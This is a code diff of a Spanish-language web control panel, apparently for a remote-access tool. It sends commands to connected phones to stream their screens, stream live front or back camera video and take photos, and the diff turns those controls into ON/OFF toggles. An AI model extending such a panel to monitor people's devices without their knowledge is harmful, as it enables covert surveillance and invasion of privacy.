@@ -162,26 +162,23 @@
                 <div class="text-xs font-bold text-[#00E5FF]">${dev.name}</div>
                 <div class="text-[9px] text-gray-400 truncate">ID: ${dev.id}</div>
             </div>
-            <!-- Controles de Pantalla -->
+            <!-- Controles de Pantalla tipo Interruptor -->
             <div class="grid grid-cols-2 gap-1">
-                <button onclick="startScreen('${dev.id}', '${dev.name}')" class="bg-[#00FF66] text-black text-[9px] font-bold py-1 px-1 rounded hover:bg-[#00cc52] transition text-center">
-                    📺 INICIAR STREAM
+                <button id="screen_btn_${dev.id}" onclick="toggleScreen('${dev.id}', '${dev.name}', this)" data-active="false" class="bg-gray-700 text-white text-[9px] font-bold py-1 px-1 rounded hover:bg-gray-600 transition text-center">
+                    📺 STREAM: OFF
                 </button>
-                <button onclick="pauseScreen('${dev.id}')" class="bg-yellow-500 text-black text-[9px] font-bold py-1 px-1 rounded hover:bg-yellow-400 transition text-center">
-                    ⏸️ REPOSO
+                <button onclick="triggerPhoto('${dev.id}')" class="bg-[#00E5FF] text-black text-[9px] font-bold py-1 px-1 rounded hover:bg-[#00b3cc] transition text-center">
+                    📸 FOTO
                 </button>
             </div>
-            <!-- Controles de Cámara -->
-            <div class="grid grid-cols-3 gap-1 pt-1 border-t border-gray-800">
+            <!-- Controles de Cámara tipo Interruptor -->
+            <div class="grid grid-cols-2 gap-1 pt-1 border-t border-gray-800">
                 <select id="lens_${dev.id}" class="bg-black text-[9px] text-[#00E5FF] border border-[#00E5FF]/40 rounded p-0.5">
                     <option value="back">Trasera</option>
                     <option value="front">Frontal</option>
                 </select>
-                <button onclick="triggerPhoto('${dev.id}')" class="bg-[#00E5FF] text-black text-[9px] font-bold py-1 px-1 rounded hover:bg-[#00b3cc] transition text-center">
-                    📸 FOTO
-                </button>
-                <button onclick="startCameraStream('${dev.id}', '${dev.name}')" class="bg-purple-500 text-white text-[9px] font-bold py-1 px-1 rounded hover:bg-purple-400 transition text-center">
-                    📹 CAM VIVO
+                <button id="cam_btn_${dev.id}" onclick="toggleCamera('${dev.id}', '${dev.name}', this)" data-active="false" class="bg-gray-700 text-white text-[9px] font-bold py-1 px-1 rounded hover:bg-gray-600 transition text-center">
+                    📹 CAM: OFF
                 </button>
             </div>
           `;
@@ -189,41 +186,63 @@
         });
       });
 
-      function startScreen(socketId, deviceName) {
-        activeStreamDevice = socketId;
-        streamingTarget.innerText = `[ Pantalla: ${deviceName} ]`;
-        log(`Iniciando pantalla para: ${deviceName}`);
-        // Limpiamos pantalla anterior mientras conecta
-        screenStream.classList.add("hidden");
-        screenPlaceholder.classList.remove("hidden");
-        socket.emit("send_command_to_device", { targetId: socketId, action: "start_screen" });
-      }
-
-      function pauseScreen(socketId) {
-        log(`Poniendo en reposo pantalla para: ${socketId}`);
-        socket.emit("send_command_to_device", { targetId: socketId, action: "pause_screen" });
+      function toggleScreen(socketId, deviceName, btn) {
+        const isActive = btn.getAttribute("data-active") === "true";
+        
+        if (!isActive) {
+          activeStreamDevice = socketId;
+          streamingTarget.innerText = `[ Pantalla: ${deviceName} ]`;
+          btn.setAttribute("data-active", "true");
+          btn.innerText = "📺 STREAM: ON";
+          btn.className = "bg-[#00FF66] text-black text-[9px] font-bold py-1 px-1 rounded transition text-center";
+          log(`Iniciando transmisión de pantalla para: ${deviceName}`);
+          socket.emit("send_command_to_device", { targetId: socketId, action: "start_screen" });
+        } else {
+          btn.setAttribute("data-active", "false");
+          btn.innerText = "📺 STREAM: OFF";
+          btn.className = "bg-gray-700 text-white text-[9px] font-bold py-1 px-1 rounded transition text-center";
+          log(`Pausando transmisión de pantalla para: ${deviceName}`);
+          socket.emit("send_command_to_device", { targetId: socketId, action: "stop_screen" });
+          if (activeStreamDevice === socketId) {
+            screenStream.classList.add("hidden");
+            screenPlaceholder.classList.remove("hidden");
+          }
+        }
       }
 
       function triggerPhoto(socketId) {
         const lens = document.getElementById(`lens_${socketId}`).value;
         activeCameraDevice = socketId;
-        cameraTarget.innerText = `[ Foto (${lens}) solicitada ]`;
         log(`Solicitando foto (${lens}) al nodo: ${socketId}`);
         socket.emit("send_command_to_device", { targetId: socketId, action: "get_photo", lens: lens });
       }
 
-      function startCameraStream(socketId, deviceName) {
-        activeCameraDevice = socketId;
+      function toggleCamera(socketId, deviceName, btn) {
+        const isActive = btn.getAttribute("data-active") === "true";
         const lens = document.getElementById(`lens_${socketId}`).value;
-        cameraTarget.innerText = `[ Cámara ${lens}: ${deviceName} ]`;
-        log(`Iniciando cámara (${lens}) para: ${deviceName}`);
-        // Limpiamos visor de cámara anterior
-        targetPhoto.classList.add("hidden");
-        photoPlaceholder.classList.remove("hidden");
-        socket.emit("send_command_to_device", { targetId: socketId, action: "start_camera", lens: lens });
+
+        if (!isActive) {
+          activeCameraDevice = socketId;
+          cameraTarget.innerText = `[ Cámara (${lens}): ${deviceName} ]`;
+          btn.setAttribute("data-active", "true");
+          btn.innerText = `📹 CAM: ON`;
+          btn.className = "bg-purple-600 text-white text-[9px] font-bold py-1 px-1 rounded transition text-center";
+          log(`Iniciando cámara (${lens}) para: ${deviceName}`);
+          socket.emit("send_command_to_device", { targetId: socketId, action: "start_camera", lens: lens });
+        } else {
+          btn.setAttribute("data-active", "false");
+          btn.innerText = "📹 CAM: OFF";
+          btn.className = "bg-gray-700 text-white text-[9px] font-bold py-1 px-1 rounded transition text-center";
+          log(`Apagando cámara para: ${deviceName}`);
+          socket.emit("send_command_to_device", { targetId: socketId, action: "stop_camera" });
+          if (activeCameraDevice === socketId) {
+            targetPhoto.classList.add("hidden");
+            photoPlaceholder.classList.remove("hidden");
+          }
+        }
       }
 
-      // Recepción de foto del celular correcto
+      // Recepción de respuestas y frames
       socket.on("phone_response", (data) => {
         if (data.deviceId === activeCameraDevice && data.type === "photo" && data.image) {
           log("¡Fotografía recibida del dispositivo activo!");
@@ -233,7 +252,6 @@
         }
       });
 
-      // Recepción de pantalla en vivo solo del nodo seleccionado
       socket.on("screen_frame", (data) => {
         if (data.deviceId === activeStreamDevice) {
           screenStream.src = `data:image/jpeg;base64,${data.frame}`;
@@ -242,7 +260,6 @@
         }
       });
 
-      // Recepción de frames de cámara en vivo solo del nodo seleccionado
       socket.on("camera_frame", (data) => {
         if (data.deviceId === activeCameraDevice) {
           targetPhoto.src = `data:image/jpeg;base64,${data.frame}`;
